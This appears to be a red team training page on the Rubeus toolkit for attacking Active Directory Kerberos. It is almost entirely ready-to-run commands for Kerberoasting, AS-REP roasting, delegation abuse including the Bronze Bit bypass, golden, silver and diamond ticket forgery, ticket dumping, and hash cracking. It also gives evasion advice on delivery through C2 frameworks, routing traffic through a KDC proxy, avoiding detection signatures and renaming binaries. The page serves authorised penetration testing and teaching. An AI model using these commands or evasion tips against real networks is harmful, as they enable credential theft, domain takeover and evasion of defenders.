---
layout: training-page
title: "Rubeus — Kerberos Abuse Toolkit — Red Team Academy"
module: "Active Directory"
tags:
  - rubeus
  - kerberos
  - tgt
  - tgs
  - s4u
  - golden-ticket
  - silver-ticket
  - diamond-ticket
  - kerberoast
  - asreproast
page_key: "ad-rubeus"
render_with_liquid: false
---

# Rubeus — Kerberos Abuse Toolkit

Rubeus is a C# toolset for raw Kerberos interaction and abuses. It talks to the KDC directly over port 88 instead of going through Microsoft's `LsaCallAuthenticationPackage` API, giving operators fine control over every aspect of ticket requests — and making it one of the most important offensive tools for modern AD engagements.

## Build / Delivery

Rubeus is a Visual Studio solution. Build once, then use across engagements.

```
git clone https://github.com/GhostPack/Rubeus
# Open Rubeus.sln in Visual Studio — Release | x64 | build
# Output: Rubeus\bin\Release\Rubeus.exe

# Common delivery paths:
#   - drop-to-disk (noisy):     copy Rubeus.exe to target
#   - in-memory execute-assembly via Cobalt Strike / Havoc / Mythic
#   - PowerShell reflection:    [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('Rubeus.exe'))
#                               [Rubeus.Program]::Main("kerberoast /nowrap".Split())
```

## Ticket Request

```
# Request a TGT with plaintext password (PTT injects into current session):
Rubeus.exe asktgt /user:svc_web /password:Summer2024! /domain:corp.local /dc:dc01.corp.local /ptt

# With NTLM hash:
Rubeus.exe asktgt /user:svc_web /rc4:hash /domain:corp.local /ptt

# With AES256 key (quieter — AES is the norm for domain accounts):
Rubeus.exe asktgt /user:svc_web /aes256:key /domain:corp.local /ptt

# OPSEC — use /opsec flag to send pre-auth exactly like Windows does:
Rubeus.exe asktgt /user:svc_web /aes256:key /opsec /nowrap

# Request a TGS (service ticket) from an existing TGT:
Rubeus.exe asktgs /ticket:base64_tgt /service:cifs/dc01.corp.local /ptt

# Silently grab the current user's TGT (no elevation) via unconstrained-delegation trick:
Rubeus.exe tgtdeleg /nowrap
```

## Kerberoasting

```
# Kerberoast every user with an SPN visible to the current user:
Rubeus.exe kerberoast /format:hashcat /outfile:kerb.hashes /nowrap

# Target specific SPN/user:
Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /nowrap
Rubeus.exe kerberoast /user:svc_sql /nowrap

# Stealth variants:
Rubeus.exe kerberoast /rc4opsec /outfile:kerb.hashes    # skip AES-only accounts, blend in
Rubeus.exe kerberoast /usetgtdeleg                      # request via delegated TGT, no clear outbound auth
Rubeus.exe kerberoast /aes                              # request AES tickets for AES-only accounts

# Crack:
hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt     # RC4
hashcat -m 19700 kerb.hashes /usr/share/wordlists/rockyou.txt     # AES256
```

## AS-REP Roasting

```
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes /nowrap

# Crack:
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

## S4U / Delegation Abuse

```
# Constrained delegation: svc_web is TrustedForDelegation → impersonate Admin to CIFS on DC:
Rubeus.exe s4u /user:svc_web /rc4:hash /domain:corp.local \
  /impersonateuser:Administrator /msdsspn:cifs/dc01.corp.local /ptt

# RBCD (Resource-Based Constrained Delegation) — first create attacker$ then:
Rubeus.exe s4u /user:attacker$ /rc4:attackerHash /domain:corp.local \
  /impersonateuser:Administrator /msdsspn:cifs/victim.corp.local /altservice:host,cifs,http /ptt

# CVE-2020-17049 (Bronze Bit) bypass of delegation restrictions:
Rubeus.exe s4u /user:svc /rc4:hash /impersonateuser:Administrator \
  /msdsspn:cifs/dc01.corp.local /bronzebit /ptt
```

## Ticket Forgery

```
# Golden Ticket (needs krbtgt hash + domain SID):
Rubeus.exe golden /aes256:KRBTGT_AES256 /user:Administrator /domain:corp.local /sid:S-1-5-21-... /ptt

# Silver Ticket (needs service account hash — e.g., computer$ for CIFS):
Rubeus.exe silver /aes256:MACHINE_AES /user:Administrator /service:cifs/srv01.corp.local \
  /domain:corp.local /sid:S-1-5-21-... /ptt

# Diamond Ticket (modify a legitimate TGT — survives some golden-ticket detections):
Rubeus.exe diamond /user:Administrator /password:UserPass \
  /domain:corp.local /krbkey:KRBTGT_AES256 /ticketuser:lowpriv /ptt
```

## Ticket Management

```
# List tickets in current logon session:
Rubeus.exe klist

# Dump all tickets from all logon sessions (requires elevation):
Rubeus.exe triage                  # summary
Rubeus.exe dump /nowrap            # full base64

# Inject base64 ticket into current session:
Rubeus.exe ptt /ticket:<base64_blob>

# Purge tickets:
Rubeus.exe purge

# Change password using a valid TGT (AoratoPw):
Rubeus.exe changepw /ticket:<base64_tgt> /new:NewPass!23
```

## Credential Harvesting

```
# Monitor 4624 events for new TGTs (useful on unconstrained delegation hosts):
Rubeus.exe monitor /interval:5 /filteruser:dc01$ /nowrap

# Harvest + auto-renew tickets in the current session:
Rubeus.exe harvest /interval:30
```

## OPSEC Notes

- Rubeus talks to the KDC over **TCP/UDP 88**. A non-Windows-Security-Provider process speaking Kerberos is a strong signal — consider `/proxyurl:https://kdcproxy/KdcProxy` (MS-KKDCP) to route through HTTPS.
- **Always prefer AES keys over RC4.** Modern DCs have `msds-SupportedEncryptionTypes = 0x1c` (AES128+AES256+RC4) and users are typically AES-only. Sending RC4 TGS-REQ for an AES user is a reliable detection (event 4769 with Ticket Encryption Type `0x17`).
- Use `/opsec` on `asktgt` and `asktgs` to emit the same two-step AS-REQ (fail → retry with pre-auth) that Windows does naturally.
- `kerberoast /rc4opsec` skips AES-only accounts to avoid the noisy fallback cycle — use it.
- `tgtdeleg` obtains a usable TGT **without** elevation and without triggering 4624 → then you can `/ptt` it into a sacrificial process via `createnetonly`.
- Classic Rubeus binary name / PDB path is heavily signatured. Rename, strip, or use loaders.

## Resources

- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- See also: `active-directory/kerberoasting.md`, `asreproasting.md`, `dcsync.md`, `kerberos-delegation.md`, `shadow-credentials.md`
